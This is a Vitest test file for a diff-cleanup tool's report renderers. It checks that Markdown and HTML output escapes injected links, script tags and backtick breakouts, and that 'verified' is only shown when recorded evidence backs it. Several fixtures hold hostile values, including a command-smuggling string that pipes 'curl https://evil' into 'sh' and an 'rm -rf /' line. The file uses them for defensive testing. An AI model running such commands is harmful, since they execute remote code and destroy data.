import { describe, expect, it } from "vitest";

import type { ShrinkReport } from "../../packages/core/src/types.js";
import {
  escapeMarkdownCodeSpan,
  escapeMarkdownText,
  renderGitHubComment,
  renderHtmlReport,
  renderMarkdownReport
} from "../../packages/report/src/index.js";

const report: ShrinkReport = {
  baseRef: "origin/main",
  headRef: "HEAD",
  input: {
    fileCount: 4,
    hunkCount: 7,
    addedLineCount: 18,
    removedLineCount: 10,
    changedLineCount: 28
  },
  output: {
    fileCount: 2,
    hunkCount: 3,
    addedLineCount: 7,
    removedLineCount: 3,
    changedLineCount: 10
  },
  removals: [
    {
      filePath: "src/ui/Button.tsx",
      hunkHeader: "@@ -1,3 +1,3 @@",
      category: "formatting-only",
      reason: "formatting-only changes, checks unchanged",
      confidence: "high-confidence removal"
    }
  ],
  kept: [
    {
      filePath: "src/auth/session.ts",
      hunkHeader: "@@ -5,6 +5,8 @@",
      category: "unknown",
      reason: "required by auth regression test",
      confidence: "kept"
    }
  ],
  needsHumanReview: [
    {
      filePath: "package.json",
      hunkHeader: "@@ -10,1 +10,1 @@",
      category: "dependency-related",
      reason: "dependency bump may be outside task scope",
      confidence: "needs-human-review"
    }
  ],
  patchPath: ".patchdiet/cleanup.diff",
  cleanupBranch: "patchdiet/cleanup-2026-05-14",
  candidates: [
    {
      filePath: "src/ui/Button.tsx",
      hunkHeader: "@@ -1,3 +1,3 @@",
      category: "formatting-only",
      verdict: "removed",
      reason: "checks still passed after reverting this hunk"
    },
    {
      filePath: "package.json",
      hunkHeader: "@@ -10,1 +10,1 @@",
      category: "dependency-related",
      verdict: "needs-human-review",
      reason: "dependency bump may be outside task scope"
    }
  ],
  testCommand: {
    command: "npm test",
    status: "passed",
    durationMs: 1234,
    attempts: 2
  },
  artifacts: [
    ".patchdiet/report.md",
    ".patchdiet/report.github.md",
    ".patchdiet/report.html",
    ".patchdiet/cleanup.diff"
  ]
};

describe("report renderers", () => {
  it("renders markdown with summary and evidence sections", () => {
    const markdown = renderMarkdownReport(report);

    expect(markdown).toContain("# PatchDiet Report");
    expect(markdown).toContain("## Summary");
    expect(markdown).toContain("Base: `origin/main`");
    expect(markdown).toContain("Test command: `npm test`");
    expect(markdown).toContain("Test status: passed");
    expect(markdown).toContain("Test attempts: 2");
    expect(markdown).toContain("PatchDiet proves only that the cleanup patch passes the configured checks");
    expect(markdown).toContain("Input diff: 4 files, 28 changed lines, 7 hunks");
    expect(markdown).toContain("Output diff: 2 files, 10 changed lines, 3 hunks");
    expect(markdown).toContain("## Removed");
    expect(markdown).toContain("## Kept");
    expect(markdown).toContain("## Needs human review");
    expect(markdown).toContain("## Artifacts");
    expect(markdown).toContain("dependency-related");
  });

  it("renders html with audit sections", () => {
    const html = renderHtmlReport(report);

    expect(html).toContain("<title>PatchDiet Report</title>");
    expect(html).toContain("Before");
    expect(html).toContain("After");
    expect(html).toContain("patchdiet/cleanup-2026-05-14");
    expect(html).toContain("formatting-only changes, checks unchanged");
    expect(html).toContain("dependency bump may be outside task scope");
    expect(html).toContain("dependency-related");
    expect(html).toContain("passes the configured checks");
  });

  it("renders a github comment body", () => {
    const comment = renderGitHubComment(report);

    expect(comment).toContain("## PatchDiet");
    expect(comment).toContain("| Before | After |");
    expect(comment).toContain("| Files | 4 | 2 |");
    expect(comment).toContain("| Hunks | 7 | 3 |");
    expect(comment).toContain("| Changed lines | 28 | 10 |");
    expect(comment).toContain("Tests: passed");
    expect(comment).toContain("Not a semantic-equivalence proof");
    expect(comment).toContain("cleanup.diff");
  });
});

function evidenceReport(overrides: Partial<ShrinkReport["removals"][number]>): ShrinkReport {
  return {
    ...report,
    removals: [{ ...report.removals[0], ...overrides }]
  };
}

describe("markdown escaping helpers", () => {
  describe("escapeMarkdownCodeSpan", () => {
    it.each([
      ["plain path renders the same single-backtick span", "src/ui/Button.tsx", "`src/ui/Button.tsx`"],
      ["bracket path stays inert inside the span", "x](https://evil", "`x](https://evil`"],
      ["single backtick widens the fence", "we`ird.ts", "``we`ird.ts``"],
      ["leading backtick run widens the fence and pads", "``x", "``` ``x ```"],
      ["link breakout attempt is fenced off", "`](https://evil)", "`` `](https://evil) ``"],
      ["trailing backtick cannot merge with the closing fence", "trailing`", "`` trailing` ``"],
      ["backtick run in the middle cannot close the span", "a``b.ts", "```a``b.ts```"],
      ["newline is flattened", "a\nb.ts", "`a b.ts`"],
      ["crlf is flattened", "a\r\nb.ts", "`a b.ts`"],
      ["null byte is flattened", "a\u0000b.ts", "`a b.ts`"]
    ] as ReadonlyArray<[string, string, string]>)("%s", (_label, input, expected) => {
      expect(escapeMarkdownCodeSpan(input)).toBe(expected);
    });
  });

  describe("escapeMarkdownText", () => {
    it.each([
      ["plain reason is unchanged", "formatting-only changes, checks unchanged", "formatting-only changes, checks unchanged"],
      ["plain hunk header is unchanged", "@@ -1,3 +1,3 @@", "@@ -1,3 +1,3 @@"],
      ["link injection is disabled", "[click](https://evil)", "\\[click\\](https://evil)"],
      ["stray closing bracket is escaped", "x](https://evil", "x\\](https://evil"],
      ["code span opener is escaped", "see `rm -rf /`", "see \\`rm -rf /\\`"],
      ["multiline value stays on one line", "ok\n## heading", "ok ## heading"],
      ["html/autolink opener is escaped", "<script>alert(1)</script>", "\\<script>alert(1)\\</script>"],
      ["backslash is escaped first so re-rendering is idempotent", "back\\slash", "back\\\\slash"]
    ] as ReadonlyArray<[string, string, string]>)("%s", (_label, input, expected) => {
      expect(escapeMarkdownText(input)).toBe(expected);
    });
  });
});

describe("markdown evidence escaping", () => {
  it.each([
    [
      "bracket-injection path stays inside the code span",
      { filePath: "x](https://evil" },
      "- `x](https://evil` (formatting-only): formatting-only changes, checks unchanged"
    ],
    [
      "backtick breakout cannot inject a live link",
      { filePath: "`](https://evil)" },
      "- `` `](https://evil) `` (formatting-only): formatting-only changes, checks unchanged"
    ],
    [
      "multiline file name stays on one line",
      { filePath: "src/a.ts\n[click](https://evil)" },
      "- `src/a.ts [click](https://evil)` (formatting-only): formatting-only changes, checks unchanged"
    ],
    [
      "injected link in reason is neutralized",
      { reason: "[click](https://evil)" },
      "- `src/ui/Button.tsx` (formatting-only): \\[click\\](https://evil)"
    ]
  ] as ReadonlyArray<[string, Partial<ShrinkReport["removals"][number]>, string]>)(
    "%s in the github comment",
    (_label, overrides, expectedLine) => {
      const comment = renderGitHubComment(evidenceReport(overrides));

      expect(comment).toContain(expectedLine);
    }
  );

  it.each([
    [
      "normal rendering stays byte-identical",
      {},
      "- `src/ui/Button.tsx` @@ -1,3 +1,3 @@ (formatting-only): formatting-only changes, checks unchanged"
    ],
    [
      "bracket-injection path",
      { filePath: "x](https://evil", hunkHeader: "@@ -1,2 +1,2 @@" },
      "- `x](https://evil` @@ -1,2 +1,2 @@ (formatting-only): formatting-only changes, checks unchanged"
    ],
    [
      "backtick breakout",
      { filePath: "`](https://evil)" },
      "- `` `](https://evil) `` @@ -1,3 +1,3 @@ (formatting-only): formatting-only changes, checks unchanged"
    ],
    [
      "multiline hunk header stays on one line",
      { hunkHeader: "@@ -1,2 +1,2 @@\n## injected" },
      "- `src/ui/Button.tsx` @@ -1,2 +1,2 @@ ## injected (formatting-only): formatting-only changes, checks unchanged"
    ]
  ] as ReadonlyArray<[string, Partial<ShrinkReport["removals"][number]>, string]>)(
    "%s in the markdown report",
    (_label, overrides, expectedLine) => {
      const markdown = renderMarkdownReport(evidenceReport(overrides));

      expect(markdown).toContain(expectedLine);
    }
  );

  it("keeps the report on the same number of lines when a file name contains newlines", () => {
    const benign = renderMarkdownReport(evidenceReport({}));
    const evil = renderMarkdownReport(evidenceReport({ filePath: "src/a.ts\n[click](https://evil)" }));

    expect(evil.split("\n").length).toBe(benign.split("\n").length);
    expect(evil).not.toContain("src/a.ts\n");
  });

  it("escapes base refs and test commands in the summary", () => {
    const benign = renderMarkdownReport(report);
    const markdown = renderMarkdownReport({
      ...report,
      baseRef: "origin/main\n[click](https://evil)",
      testCommand: { ...report.testCommand, command: "npm test` && curl https://evil | sh" }
    });

    expect(markdown).toContain("Base: `origin/main [click](https://evil)`");
    expect(markdown).toContain("Test command: ``npm test` && curl https://evil | sh``");
    expect(markdown.split("\n").length).toBe(benign.split("\n").length);
  });

  it("keeps normal artifact paths and branch names unchanged", () => {
    const markdown = renderMarkdownReport(report);

    expect(markdown).toContain("- Cleanup patch: .patchdiet/cleanup.diff");
    expect(markdown).toContain("- Markdown report: .patchdiet/report.md");
    // Ghost-free artifacts: run.json is not in the fixture artifacts list,
    // so no JSON report line may be invented.
    expect(markdown).not.toContain("JSON report");
    expect(markdown).toContain("- GitHub comment report: .patchdiet/report.github.md");
    expect(markdown).toContain("- HTML report: .patchdiet/report.html");
    expect(markdown).toContain("- Cleanup branch: patchdiet/cleanup-2026-05-14");
  });

  it("escapes a malicious artifact path in markdown and html contexts without double-escaping", () => {
    const markdown = renderMarkdownReport({ ...report, cleanupBranch: "`](https://evil)" });
    const html = renderHtmlReport({ ...report, cleanupBranch: "`](https://evil)" });

    expect(markdown).toContain("- Cleanup branch: \\`\\](https://evil)");
    expect(html).toContain("<li>Cleanup branch: `](https://evil)</li>");
  });

  it("escapes malicious evidence in the html report", () => {
    const html = renderHtmlReport(evidenceReport({ filePath: "<script>alert(1)</script>" }));

    expect(html).not.toContain("<script>alert(1)</script>");
    expect(html).toContain("<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>");
  });
});

// ── P0-3 F5: the verified claim must rest on recorded evidence, never on mode ──

const VERIFY_HEAD = "a".repeat(40);
const VERIFY_BASE = "b".repeat(40);
const VERIFY_TREE = "c".repeat(40);

function passedCommand(command = "node -e \"process.exit(0)\"") {
  return { command, status: "passed" as const, durationMs: 5, attempts: 1, exitCode: 0 };
}

function evidenceReportWith(overrides: {
  mode?: ShrinkReport["mode"];
  partial?: boolean;
  baselineStatus?: "passed" | "failed" | "not-run";
  finalStatus?: "passed" | "failed" | "not-run";
  treesMatch?: boolean;
  omitVerification?: boolean;
  baseShaMismatch?: boolean;
}): ShrinkReport {
  const verification = overrides.omitVerification
    ? undefined
    : {
        baseline: {
          stage: "baseline" as const,
          status: overrides.baselineStatus ?? ("passed" as const),
          commands: [passedCommand()],
          durationMs: 5,
          headCommitSha: VERIFY_HEAD
        },
        final: {
          stage: "final" as const,
          status: overrides.finalStatus ?? ("passed" as const),
          commands: [passedCommand()],
          durationMs: 5,
          baseCommitSha: overrides.baseShaMismatch ? VERIFY_HEAD : VERIFY_BASE,
          headCommitSha: VERIFY_HEAD,
          expectedTreeSha: VERIFY_TREE,
          artifactTreeSha: VERIFY_TREE,
          treesMatch: overrides.treesMatch ?? true
        }
      };
  return {
    ...report,
    mode: overrides.mode ?? "verified",
    partial: overrides.partial,
    baseCommitSha: VERIFY_BASE,
    headCommitSha: VERIFY_HEAD,
    testCommand: { command: "node -e", status: "passed", durationMs: 5, attempts: 1 },
    verification
  };
}

describe("report rendering: verification evidence predicate", () => {
  it("renders a fully evidenced run as verified", () => {
    const report = evidenceReportWith({});
    expect(renderGitHubComment(report)).toContain("verified the exact artifact");
    expect(renderGitHubComment(report)).not.toContain("NOT VERIFIED");
    expect(renderMarkdownReport(report)).not.toContain("NOT VERIFIED");
    expect(renderHtmlReport(report)).not.toContain("NOT VERIFIED");
  });

  it("refuses mode=verified when the final stage failed (contradictory serialized input)", () => {
    const report = evidenceReportWith({ finalStatus: "failed" });
    for (const rendered of [
      renderGitHubComment(report),
      renderMarkdownReport(report),
      renderHtmlReport(report)
    ]) {
      expect(rendered).toContain("NOT VERIFIED");
      expect(rendered).not.toContain("verified the exact artifact");
    }
  });

  it("refuses mode=verified when the artifact tree does not match the expected tree", () => {
    const report = evidenceReportWith({ treesMatch: false });
    for (const rendered of [
      renderGitHubComment(report),
      renderMarkdownReport(report),
      renderHtmlReport(report)
    ]) {
      expect(rendered).toContain("NOT VERIFIED");
    }
  });

  it("refuses mode=verified when final evidence SHAs do not match the report's pinned SHAs", () => {
    const report = evidenceReportWith({ baseShaMismatch: true });
    expect(renderGitHubComment(report)).toContain("NOT VERIFIED");
    expect(renderMarkdownReport(report)).toContain("NOT VERIFIED");
  });

  it("refuses mode=verified when the report is partial", () => {
    const report = evidenceReportWith({ partial: true });
    expect(renderGitHubComment(report)).toContain("NOT VERIFIED");
    expect(renderMarkdownReport(report)).toContain("NOT VERIFIED");
  });

  it("refuses mode=verified for a legacy report without recorded verification", () => {
    const report = evidenceReportWith({ omitVerification: true });
    expect(renderGitHubComment(report)).toContain("NOT VERIFIED");
    expect(renderMarkdownReport(report)).toContain("NOT VERIFIED");
  });

  it("refuses mode=verified when final commands were never executed", () => {
    const verified = evidenceReportWith({});
    const report: ShrinkReport = {
      ...verified,
      verification: {
        baseline: { ...verified.verification!.baseline },
        final: { ...verified.verification!.final, commands: [] }
      }
    };
    expect(renderGitHubComment(report)).toContain("NOT VERIFIED");
    expect(renderMarkdownReport(report)).toContain("NOT VERIFIED");
  });
});

describe("report rendering: baseline command evidence is required too", () => {
  it("refuses mode=verified when the baseline passed without recorded command evidence", () => {
    const verified = evidenceReportWith({});
    const report: ShrinkReport = {
      ...verified,
      verification: {
        baseline: { ...verified.verification!.baseline, commands: [] },
        final: { ...verified.verification!.final }
      }
    };
    expect(renderGitHubComment(report)).toContain("NOT VERIFIED");
    expect(renderMarkdownReport(report)).toContain("NOT VERIFIED");
    expect(renderHtmlReport(report)).toContain("NOT VERIFIED");
  });

  it("refuses mode=verified when a baseline command timed out despite status passed", () => {
    const verified = evidenceReportWith({});
    const report: ShrinkReport = {
      ...verified,
      verification: {
        baseline: {
          ...verified.verification!.baseline,
          commands: [{ command: "x", status: "passed", durationMs: 5, attempts: 1, timedOut: true, exitCode: 0 }]
        },
        final: { ...verified.verification!.final }
      }
    };
    expect(renderMarkdownReport(report)).toContain("NOT VERIFIED");
  });

  it("renders the effective mode as unverified for contradictory input (never the declared mode)", () => {
    const report = evidenceReportWith({ finalStatus: "failed" });
    const markdown = renderMarkdownReport(report);
    expect(markdown).toContain("- Mode: unverified");
    expect(markdown).not.toContain("- Mode: verified");
    expect(markdown).toContain("- Declared mode: verified");
    const html = renderHtmlReport(report);
    expect(html).toContain("Mode:</strong> unverified");
    expect(html).not.toContain("Mode:</strong> verified");
  });
});

describe("report rendering: baseline and final must attest the same oracle set", () => {
  it("refuses mode=verified when baseline and final ran different required commands", () => {
    const verified = evidenceReportWith({});
    const report: ShrinkReport = {
      ...verified,
      verification: {
        baseline: {
          ...verified.verification!.baseline,
          commands: [passedCommand("node baseline-check.js")]
        },
        final: {
          ...verified.verification!.final,
          commands: [passedCommand("node final-check.js")]
        }
      }
    };
    expect(renderGitHubComment(report)).toContain("NOT VERIFIED");
    expect(renderMarkdownReport(report)).toContain("NOT VERIFIED");
    expect(renderHtmlReport(report)).toContain("NOT VERIFIED");
    expect(renderMarkdownReport(report)).toContain("- Mode: unverified");
  });

  it("refuses mode=verified when the final stage ran fewer commands than the baseline", () => {
    const verified = evidenceReportWith({});
    const report: ShrinkReport = {
      ...verified,
      verification: {
        baseline: {
          ...verified.verification!.baseline,
          commands: [passedCommand("node a.js"), passedCommand("node b.js")]
        },
        final: { ...verified.verification!.final, commands: [passedCommand("node a.js")] }
      }
    };
    expect(renderMarkdownReport(report)).toContain("NOT VERIFIED");
  });
});
